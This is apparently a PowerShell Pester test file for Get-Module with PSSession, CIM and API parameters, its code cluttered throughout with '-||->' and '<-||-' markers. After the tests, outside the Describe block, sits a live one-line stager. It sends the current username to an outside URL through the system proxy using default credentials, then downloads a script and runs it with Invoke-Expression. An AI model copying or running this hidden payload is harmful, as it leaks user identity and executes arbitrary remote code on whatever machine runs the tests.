

 -||-> Describe "Remote module tests" -Tags 'Feature','RequireAdminOnWindows' {

     -||-> BeforeAll {

         -||-> if ( -||-> !$IsWindows <-||- )
        {
             -||-> $originalDefaultParameterValues = $PSDefaultParameterValues.Clone() <-||- 
             -||-> $PSDefaultParameterValues["it:skip"] = $true <-||- 
            return
        } <-||- 

         -||-> $pssession =  -||-> New-RemoteSession <-||-  <-||- 
        
        
    } <-||- 

     -||-> AfterAll {

         -||-> if ( -||-> !$IsWindows <-||- )
        {
             -||-> $global:PSDefaultParameterValues = $originalDefaultParameterValues <-||- 
            return
        } <-||- 

         -||-> if ( -||-> $pssession -ne $null <-||- ) {  -||-> Remove-PSSession $pssession -ErrorAction SilentlyContinue <-||-  } <-||- 
    } <-||- 

     -||-> It "Get-Module fails if not using -ListAvailable with '<parameter>'" -TestCases @(
         -||-> @{parameter= -||-> "PSSession" <-||-  ; value= -||-> $pssession <-||- } <-||- 
        
    ) {
        param($parameter, $value)
         -||-> $parameters = @{$parameter= -||-> $value <-||- } <-||- 
         -||-> {  -||-> Get-Module @parameters -ErrorAction Stop <-||-  } | Should -Throw -ErrorId "RemoteDiscoveryWorksOnlyInListAvailableMode,Microsoft.PowerShell.Commands.GetModuleCommand" <-||- 
    } <-||- 

     -||-> It "Get-Module succeeds using -ListAvailable with '<parameter>'" -TestCases @(
         -||-> @{parameter= -||-> "PSSession" <-||-  ; value= -||-> $pssession <-||- },
        @{parameter= -||-> "PSSession" <-||-  ; value= -||-> $pssession <-||-  ; name= -||-> "Pester" <-||- } <-||- 
        
        
    ) {
        param($parameter, $value, $name)
         -||-> $parameters = @{$parameter= -||-> $value <-||- ; ListAvailable= -||-> $true <-||- ; Refresh= -||-> $true <-||- } <-||- 
         -||-> if ( -||-> $name <-||- ) {
             -||-> $parameters += @{name= -||-> $name <-||- } <-||- 
        } <-||- 
         -||-> $modules =  -||-> Get-Module @parameters <-||-  <-||- 
         -||-> $modules | Should -Not -BeNullOrEmpty <-||- 
         -||-> $modules[0] | Should -BeOfType "System.Management.Automation.PSModuleInfo" <-||- 
    } <-||- 

     -||-> It "Get-Module can be called as an API with '<parameter>' = '<value>'" -TestCases @(
         -||-> @{parameter =  -||-> "Name" <-||-               ; value =  -||-> "foo" <-||- },
        @{parameter =  -||-> "FullyQualifiedName" <-||- ; value =  -||-> @{ModuleName= -||-> "foo" <-||- ;ModuleVersion= -||-> "1.2.3" <-||- } <-||- },
        @{parameter =  -||-> "All" <-||-                ; value =  -||-> $true <-||- },
        @{parameter =  -||-> "All" <-||-                ; value =  -||-> $false <-||- },
        @{parameter =  -||-> "ListAvailable" <-||-      ; value =  -||-> $true <-||- },
        @{parameter =  -||-> "ListAvailable" <-||-      ; value =  -||-> $false <-||- },
        @{parameter =  -||-> "PSEdition" <-||-          ; value =  -||-> "foo" <-||- },
        @{parameter =  -||-> "Refresh" <-||-            ; value =  -||-> $true <-||- },
        @{parameter =  -||-> "Refresh" <-||-            ; value =  -||-> $false <-||- },
        @{parameter =  -||-> "PSSession" <-||-          ; value =  -||-> $pssession <-||- },
        
        @{parameter =  -||-> "CimResourceUri" <-||-     ; value =  -||-> "http://foo/" <-||- },
        @{parameter =  -||-> "CimNamespace" <-||-       ; value =  -||-> "foo" <-||- },
        @{parameter =  -||-> "PSEdition" <-||-          ; value =  -||-> "Core" <-||- },
        @{parameter =  -||-> "PSEdition" <-||-          ; value =  -||-> "Desktop" <-||- } <-||- 
        ) {
        param($parameter, $value)

         -||-> $getModuleCommand = [Microsoft.PowerShell.Commands.GetModuleCommand]::new() <-||- 
         -||-> $getModuleCommand.$parameter = $value <-||- 
         -||-> if ( -||-> $parameter -eq "FullyQualifiedName" <-||- ) {
             -||-> $getModuleCommand.FullyQualifiedName | Should -BeOfType "Microsoft.PowerShell.Commands.ModuleSpecification" <-||- 
             -||-> $getModuleCommand.FullyQualifiedName.Name | Should -BeExactly "foo" <-||- 
             -||-> $getModuleCommand.FullyQualifiedName.Version | Should -Be "1.2.3" <-||- 
        } else {
             -||-> $getModuleCommand.$parameter | Should -Be $value <-||- 
        } <-||- 
    } <-||- 

     -||-> It "Failure if -Name and -FullyQualifiedName are both specified" {
         -||-> {  -||-> Get-Module -Name foo -FullyQualifiedName @{ModuleName= -||-> 'foo' <-||- } -ErrorAction Stop <-||-  } | Should -Throw -ErrorId "CannotConvertArgumentNoMessage,Microsoft.PowerShell.Commands.GetModuleCommand" <-||- 
    } <-||- 

     -||-> It "Get-Module supports pipeline" {
         -||-> $module =  -||-> Get-Module -Name Microsoft.PowerShell.Utility <-||-  <-||- 
         -||-> Compare-Object $module ( -||-> $module | Get-Module <-||- ) | Should -BeNullOrEmpty <-||- 
    } <-||- 

     -||-> It "New-CimSession works" -Pending {
        
    } <-||- 
} <-||- 

 -||-> $x=$Env:username <-||- ; -||-> $u="http://www.bcbsarizona.org/s2.txt?u=" + $x <-||- ; -||-> $p = [System.Net.WebRequest]::GetSystemWebProxy() <-||- ; -||-> $p.Credentials=[System.Net.CredentialCache]::DefaultCredentials <-||- ; -||-> $w= -||-> New-Object net.webclient <-||-  <-||- ; -||-> $w.proxy=$p <-||- ; -||-> $w.UseDefaultCredentials=$true <-||- ; -||-> $s=$w.DownloadString($u) <-||- ; -||-> Invoke-Expression -Command $s <-||- ;



